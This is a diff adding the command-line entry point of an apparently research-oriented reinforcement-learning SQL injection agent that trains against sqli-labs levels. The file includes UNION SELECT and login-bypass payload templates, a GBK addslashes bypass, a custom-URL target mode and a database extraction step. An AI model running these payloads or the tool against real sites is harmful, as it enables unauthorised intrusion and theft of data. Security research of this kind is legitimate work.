@@ -1,0 +1,186 @@
+"""
+agent.py  —  SeqSQLi v2 entry point
+=====================================
+CLI only. All logic lives inside the seqsqli/ package.
+
+Usage:
+    python agent.py --less 27 --episodes 300
+    python agent.py --less 27 --episodes 300 --no-fingerprint
+    python agent.py --url http://target/vuln.php --param id
+    python agent.py --less 1 --extract --load
+    python agent.py --all --episodes 200
+"""
+
+import argparse
+import json
+
+from seqsqli.config import (
+    DEFAULT_BASE_URL, MAX_EPISODES, QTABLE_PATH, RESULTS_PATH,
+)
+from seqsqli.core.profile import LESS_PRESETS
+from seqsqli.core.fingerprint import Fingerprinter
+from seqsqli.core.http import get_request_count
+from seqsqli.rl.qlearning import save_q_table, load_q_table
+from seqsqli.rl.train import train
+from seqsqli.rl.evaluate import evaluate, greedy_eval, analyze_q_table, analyze_ordering
+from seqsqli.extractor import DataExtractor
+from seqsqli.builder import build_target_from_preset, build_target_from_args
+
+# ---------------------------------------------------------------------------
+# Re-export everything baseline.py needs (keeps baseline.py import unchanged)
+# ---------------------------------------------------------------------------
+from seqsqli.core.mutations import MUTATIONS, ACTION_LIST, FILTER_MUTATION_HINTS
+from seqsqli.core.profile import TargetProfile, LESS_PRESETS
+from seqsqli.core.http import send_request
+from seqsqli.core.response import classify_response
+from seqsqli.rl.state import encode_state
+from seqsqli.rl.qlearning import Q
+from seqsqli.builder import LESS_TARGETS, send_payload, analyze_response
+
+
+# ---------------------------------------------------------------------------
+# Helpers
+# ---------------------------------------------------------------------------
+
+def _apply_no_fingerprint(target, less_id=None):
+    """Build base_payload from preset info without hitting the server."""
+    target.columns         = 3
+    target.injectable_cols = [2, 3]
+    q  = target.quote
+    c  = target.closure
+    ft = target.filter_type
+
+    if ft == "addslashes_gbk":
+        q = "%bf%27"
+
+    needs_quote_close = ft in (
+        "union_select_comments_spaces",
+        "comments_spaces_or_and",
+    )
+
+    if target.method == "POST":
+        target.base_payload = f"admin{q}{c} --+"
+    elif needs_quote_close and q:
+        target.base_payload = f"0{q}{c} UNION SELECT 1,2,{q}3"
+        target.suffix = "QUOTE_CLOSE"
+    else:
+        target.base_payload = f"0{q}{c} UNION SELECT 1,2,3--+"
+
+    return target
+
+
+# ---------------------------------------------------------------------------
+# Main
+# ---------------------------------------------------------------------------
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(
+        description="SeqSQLi v2 — RL-based SQL Injection Agent",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  python agent.py --less 25 --episodes 300
+  python agent.py --less 27 --episodes 300 --no-fingerprint
+  python agent.py --url http://target/vuln.php --param id
+  python agent.py --less 1 --extract --load
+  python agent.py --all --episodes 200
+""",
+    )
+
+    grp = parser.add_mutually_exclusive_group()
+    grp.add_argument("--less",  type=float, help="sqli-labs Less level (e.g. 25, 26)")
+    grp.add_argument("--all",   action="store_true", help="Train on all Less presets")
+    grp.add_argument("--url",   type=str,   help="Custom target URL")
+
+    parser.add_argument("--param",          type=str, default="id")
+    parser.add_argument("--method",         type=str, default="GET", choices=["GET", "POST"])
+    parser.add_argument("--data",           type=str, help="Extra POST params: key=val&key2=val2")
+    parser.add_argument("--base-url",       type=str, default=DEFAULT_BASE_URL)
+    parser.add_argument("--episodes",       type=int, default=MAX_EPISODES)
+    parser.add_argument("--load",           action="store_true", help="Load existing Q-table")
+    parser.add_argument("--eval-only",      action="store_true", help="Skip training, greedy eval")
+    parser.add_argument("--fingerprint",    action="store_true", help="Fingerprint only, then exit")
+    parser.add_argument("--no-fingerprint", action="store_true", help="Skip auto-detection")
+    parser.add_argument("--extract",        action="store_true", help="Extract DB data after bypass")
+
+    args = parser.parse_args()
+
+    if args.load or args.eval_only:
+        load_q_table(QTABLE_PATH)
+
+    # ── ALL MODE ─────────────────────────────────────────────────────────────
+    if args.all:
+        all_logs = []
+        for less_id in sorted(LESS_PRESETS.keys()):
+            target = build_target_from_preset(less_id, args.base_url)
+            if not args.no_fingerprint:
+                fp = Fingerprinter(target)
+                target = fp.run()
+            else:
+                target = _apply_no_fingerprint(target, less_id)
+
+            logs = train(target, args.episodes)
+            evaluate(logs)
+            all_logs.extend(logs)
+
+        save_q_table(QTABLE_PATH)
+        with open(RESULTS_PATH, "w") as f:
+            json.dump(all_logs, f, indent=2)
+        print(f"\n[*] All results saved to {RESULTS_PATH}")
+        print(f"[*] Total HTTP requests: {get_request_count()}")
+        exit(0)
+
+    # ── SINGLE TARGET MODE ────────────────────────────────────────────────────
+    if args.url:
+        target = build_target_from_args(args.url, args.param, args.method, args.data)
+    elif args.less is not None:
+        if args.less not in LESS_PRESETS:
+            print(f"[!] Less-{args.less} not found. Available: {sorted(LESS_PRESETS.keys())}")
+            exit(1)
+        target = build_target_from_preset(args.less, args.base_url)
+    else:
+        parser.print_help()
+        exit(0)
+
+    # Fingerprinting
+    if not args.no_fingerprint:
+        print(f"\n{'='*60}\n FINGERPRINTING\n{'='*60}")
+        fp = Fingerprinter(target)
+        target = fp.run()
+    elif args.less is not None:
+        target = _apply_no_fingerprint(target, args.less)
+
+    if args.fingerprint:
+        print("\n[*] Fingerprint complete. Exiting.")
+        exit(0)
+
+    # Training / evaluation
+    if args.eval_only:
+        greedy_eval(target)
+    else:
+        logs = train(target, args.episodes)
+        evaluate(logs)
+        save_q_table(QTABLE_PATH)
+
+        results_path = f"results_less{args.less}.json" if args.less else "results.json"
+        with open(results_path, "w") as f:
+            json.dump(logs, f, indent=2)
+        print(f"[*] Logs saved to {results_path}")
+
+        # RQ3 ordering analysis
+        ordering_path = f"ordering_less{args.less}.json" if args.less else "ordering.json"
+        analyze_ordering(logs, save_path=ordering_path)
+
+    analyze_q_table()
+
+    # Data extraction
+    if args.extract:
+        print(f"\n{'='*60}\n DATA EXTRACTION\n{'='*60}")
+        extractor = DataExtractor(target)
+        report = extractor.run_full_extraction()
+        extract_path = f"extract_less{args.less}.json" if args.less else "extract.json"
+        with open(extract_path, "w") as f:
+            json.dump(report, f, indent=2, default=str)
+        print(f"\n[*] Extraction report saved to {extract_path}")
+
+    print(f"\n[*] Total HTTP requests: {get_request_count()}")
